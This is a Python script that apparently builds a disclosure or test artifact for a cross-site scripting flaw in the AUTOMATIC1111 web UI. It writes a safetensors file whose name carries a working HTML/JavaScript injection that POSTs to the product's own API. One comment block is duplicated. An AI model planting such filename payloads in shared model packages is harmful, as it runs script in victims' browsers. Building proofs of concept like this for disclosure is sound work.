#!/usr/bin/env python3
"""Build the artifact for a1111.extra_networks_filename_xss.

The attacker's whole capability here is the NAME of a file inside the model
package.  On Linux and macOS every byte except '/' and NUL is legal in a path
component (Windows forbids the quote characters, which is the honest limit of
this root), so a shared LoRA archive can carry markup in its filename.

The tensor payload is an ordinary, valid safetensors file written by the
official writer.  Only the name is hostile, and it has to fit in the 255-byte
ext4/overlayfs limit for one path component.
"""
import hashlib
import json
import pathlib

import torch
from safetensors.torch import save_file

HERE = pathlib.Path(__file__).resolve().parent
ART = HERE / "artifact"

# Breaks out of  data-clipboard-text="{filename}"  in
# html/extra-networks-copy-path-button.html:3 (filled at
# modules/ui_extra_networks.py:273 with no html.escape) and then uses the page's
# own origin to drive the product's public settings API.
# Breaks out of  data-clipboard-text="{filename}"  in
# html/extra-networks-copy-path-button.html:3 (filled at
# modules/ui_extra_networks.py:273 with no html.escape) and then uses the page's
# own origin to POST to the product's public API.
#
# HARD CONSTRAINT: one path component is at most 255 bytes on ext4/overlayfs and
# it may not contain '/', so the URL path separators are built with
# String.fromCharCode(47). A full settings-rewrite payload measures 287 bytes and
# does NOT fit; that is a real limit of this carrier, recorded in report.en.md.
PAYLOAD_STEM = (
    'x"><img src=x onerror=\'var s=String.fromCharCode(47);'
    'fetch(s+"sdapi"+s+"v1"+s+"refresh-checkpoints",{method:"POST"})'
    '.then(r=>document.documentElement.dataset.mbe2e="W"+r.status)\'>'
)
BENIGN_STEM = "benign_lora"


def write(root: pathlib.Path, stem: str) -> pathlib.Path:
    root.mkdir(parents=True, exist_ok=True)
    p = root / (stem + ".safetensors")
    save_file(
        {"lora_down.weight": torch.zeros(4, dtype=torch.float32)},
        str(p),
        metadata={"format": "pt", "ss_output_name": "mbe2e"},
    )
    return p


def main() -> None:
    name = PAYLOAD_STEM + ".safetensors"
    assert len(name.encode()) <= 255, f"filename is {len(name.encode())} bytes, max 255"
    write(ART / "pos", PAYLOAD_STEM)
    write(ART / "neg", BENIGN_STEM)

    manifest = {}
    for p in sorted(ART.rglob("*")):
        if p.is_file():
            manifest[str(p.relative_to(ART))] = {
                "sha256": hashlib.sha256(p.read_bytes()).hexdigest(),
                "size": p.stat().st_size,
                "name_bytes": len(p.name.encode()),
            }
    blob = json.dumps(manifest, indent=2, sort_keys=True, ensure_ascii=False)
    (HERE / "artifact_manifest.json").write_text(blob + "\n", encoding="utf-8")
    print(blob)
    print("payload filename bytes:", len(name.encode()))


if __name__ == "__main__":
    main()
